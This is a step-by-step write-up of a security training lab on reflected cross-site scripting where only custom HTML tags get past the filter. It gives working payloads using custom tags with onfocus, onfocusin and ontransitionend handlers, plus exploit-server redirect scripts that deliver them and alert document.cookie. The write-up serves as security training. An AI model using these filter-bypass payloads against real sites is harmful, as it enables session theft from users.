# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

# Step 1 Test search funtion for XSS

I find that if I search using html tags, that my output is reflected on the page:
![image](https://user-images.githubusercontent.com/83407557/211054613-0d8c6fb7-ac46-48b7-9c3e-3817e7b66c9a.png)
![image](https://user-images.githubusercontent.com/83407557/211054670-78a3702c-01c8-4baa-a846-43d1ee9f5020.png)

However any attempt to add known tags throws an error:

![image](https://user-images.githubusercontent.com/83407557/211054822-fc162e24-2602-471e-b34b-47ca803a27e7.png)
![image](https://user-images.githubusercontent.com/83407557/211054875-5b856ccd-6354-4e15-a0a2-6d971584058e.png)

# Step 2 Create an intruder attack using custom tags

I capture a test string with burp and send it to intruder:

![image](https://user-images.githubusercontent.com/83407557/211055319-7eb91c5b-a359-4ddb-9e32-405f7a839d6c.png)

I add a payload position on the string "test"

![image](https://user-images.githubusercontent.com/83407557/211055535-ee5d4dec-00fc-4fc8-b111-1c6de3dcfbf8.png)

Using the [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) I select custom tags with all events, and copy payloads under Event handlesrs that do not require user interaction:

![image](https://user-images.githubusercontent.com/83407557/211057224-1a66daa8-4264-40b3-844d-b11e429bac22.png)

And add the copied payloads from this list into the payloads section of my intruder attack:

![image](https://user-images.githubusercontent.com/83407557/211057684-703cd62f-0c76-4fba-b534-0ea10fba33c3.png)

I find that three of the payloads returned 200 ok response codes:

![image](https://user-images.githubusercontent.com/83407557/211057929-cd2eb43e-02f5-441e-8a0b-7df76f5c048c.png)

```html
<xss id=x tabindex=1 onfocus=alert(1)></xss>

<xss id=x tabindex=1 onfocusin=alert(1)></xss>

<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
```

# Step 3 Create payloads 

Using the cheat sheet I can click on the links for each of these to view a POC:

![image](https://user-images.githubusercontent.com/83407557/211066414-71ff9942-884b-4a52-b493-5979f09eb2c4.png)

![image](https://user-images.githubusercontent.com/83407557/211066623-a5c1ee2c-63b9-41f8-98f3-857dfac53cf0.png)

Using this I can copy the payload parts of the URLs:

```html
<xss id%3Dx tabindex%3D1 onfocus%3Dalert(1)><%2Fxss>#x
  
<xss id%3Dx tabindex%3D1 onfocusin%3Dalert(1)><%2Fxss>#x
  
<xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x  
```
Turning these into payloads that I can host on the attack server

```html
<script>
  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocus%3Dalert(1)><%2Fxss>#x';
</script>
```

```html
<script>
  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocusin%3Dalert(1)><%2Fxss>#x';
</script>
```

```html
<script>
  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x';
</script>
```

# Step 4 add payloads to attack server

I am going to try each payload in-turn on myself using the attack server:

## onfocus

![image](https://user-images.githubusercontent.com/83407557/211079594-2083b325-ab04-4abc-a5ed-e0f30540a131.png)

executes xss

![image](https://user-images.githubusercontent.com/83407557/211079640-3b96c85a-3fc5-4a0f-890b-04cb9e10a4dc.png)


## onfocusin

![image](https://user-images.githubusercontent.com/83407557/211079856-ec4f44c4-0c3c-4eae-8e33-0889e1cb0f32.png)

executes xss

![image](https://user-images.githubusercontent.com/83407557/211079932-84ce756c-4031-40ea-a39f-be08dec66ae9.png)

## ontransitionend

![image](https://user-images.githubusercontent.com/83407557/211080314-c950a347-1b82-4402-ae7d-7bcead2d40ac.png)

Executes xss

![image](https://user-images.githubusercontent.com/83407557/211080568-857551d1-0146-4de1-88ae-8ae12069d593.png)

So all three payloads can be used to exploit the victim

# Step 5 modify a payload to alert document.cookie

Since the POC were all using alert(1), I change it to alert(document.cookie) 

![image](https://user-images.githubusercontent.com/83407557/211081083-0fc9b385-24bd-4958-b0d7-cd1b224a238b.png)

And retest the exploit on myself(blank since I have no cookies:

![image](https://user-images.githubusercontent.com/83407557/211081189-f247e6ff-729c-4aeb-99fa-5e16bc9c45a0.png)

# Step 6 send exploit to victim

Despite all of the payloads working against me, the only one that solves the lab seems to be this one:

```html
<script>
  location = 'https://0ad6009d045b3b60c04db8d4007800ed.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocus%3Dalert(document.cookie)><%2Fxss>#x';
</script>
```
![image](https://user-images.githubusercontent.com/83407557/211084213-2984d535-2d66-48b3-be52-5812aa662baa.png)

